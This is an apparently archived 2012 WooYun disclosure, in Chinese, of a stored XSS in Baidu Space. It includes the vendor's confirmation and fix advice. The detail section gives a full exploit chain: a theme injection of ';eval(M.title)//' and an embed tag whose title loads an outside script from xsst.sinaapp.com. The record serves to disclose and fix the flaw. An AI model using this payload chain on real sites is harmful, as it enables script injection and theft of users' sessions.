{"id": 19150, "wybug_id": "wooyun-2012-07571", "wybug_title": "新版百度空间存储型XSS", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2012-05-27 15:03", "wybug_open_date": "2012-07-11 15:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "利用技巧", "黑盒"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-11：\t细节向公众公开  简要描述： 新版的百度空间有一处没有过滤导致XSS，但是可以被利用的字段，长度限制为了20个长度，去掉两端的构造字符，只有16个长度了。还是老办法，eval(X), eval(name)的方法在利用上比较间接，不做第一考虑，我们还是优先想办法找一处可以注入ID=\"X\"的位置，然后。。。  详细说明：  1. 漏洞出现在新版百度空间模板的选择上。2. 缺陷地址：http://hi.baidu.com/set/submit/theme3. 缺陷参数: template4. 缺陷原因: 除了限制了20个长度，未做任何输入输出过滤。5. theme在注入自定义内容后，将在空间主页以及各文章页面内以下代码处出现。\nwindow.CurrentApplyedTpl = '{template内容}';\n6. 基于此，我们可以构造恶意代码如下：\nwindow.CurrentApplyedTpl = '';eval(XXX)//';   //XXX表示可以被控制的变量\n7.  XXX 可选对象\t';eval(qUserInfo.spaceName)//    <--29个长度，不可取\t';eval(M.innerHTML)//  <-- 21个长度，也不行\t';eval(M.title)//      <--17个长度\t';eval(M.name)//      <--16个长度\t';eval(M.alt)//      <--15个长度\t';eval(M.src)//      <--15个长度8. 基于以上考虑，我们就得找一个位置，可以写入 id=\"M\" 属性名=\"被eval的代码\"。\t但是经过测试，百度空间发表文章里的 <img> 标签无法写入 id属性。9. 但是运气比较好的是，偶然随手测试发现<embed></embed>标签竟然可以直接使用（难道是旧版空间的残留？）\t运气更不错的是，<embed></embed> 还可以写入 title 属性。(其它的 alt,name 无法写入，src需要以http://开头)10. 因而，我们可以构造出以下利用步骤。利用步骤：A. POST http://hi.baidu.com/set/submit/theme   POSTDATA   template=';eval(M.title)//&bdstoken={my token}&qing_request_source=B. 随便发表一篇文章。 POST的content内容修改为以下：   POST http://hi.baidu.com/pub/submit/modifytext   POSTDATA (content以外的参数省略)   content=encodeURIComponent(<div><p><embed src=\"http://www.toolmao.com\" id=\"M\" title=\"(function(){var s=document.createElement('script');s.src='http://xsst.sinaapp.com/m.js';document.body.appendChild(s)})()\"</p></div>)C. 那么此文章就成了一个可以用来跨站的页面了。效果见漏洞证明！   漏洞证明：  测试平台: Win7 + Chrome, IEChrome下的效果\n\nIE 下的效果\n\n   修复方案：  1. http://hi.baidu.com/set/submit/theme 过滤template的内容2. http://hi.baidu.com/pub/submit/modifytext 新版空间还用的到embed标签不？就算用的到，也可以和img一样，把id给过滤掉。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-05-30 17:18 厂商回复： 感谢提交，正在修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-28 12:21 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  新产品必有漏洞    \n     2012-05-28 15:11 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @水滴 对的 :) 就是冲着这句话去的～～    \n     2012-05-28 18:40 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  @gainover 可惜没有新版邀请码    \n     2012-05-28 19:30 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @水滴 = = 新版还要邀请码？ 我好像就是直接提示升级的。。    \n     2012-05-29 22:53 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我嘞个去。太给力了。    \n     2012-05-29 23:45 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @zeracker 二...师兄～～ 最近猪肉涨价了～～     \n     2012-05-29 23:48 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @gainover 176 57kg 。没钱买肉了。    \n     2012-05-29 23:54 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @zeracker 我了个去。。你平均下来比我还瘦。。     \n     2012-06-19 19:32 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞 太坑了    \n     2012-07-11 19:43 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  好！    \n     2012-07-11 20:42 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  妙！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}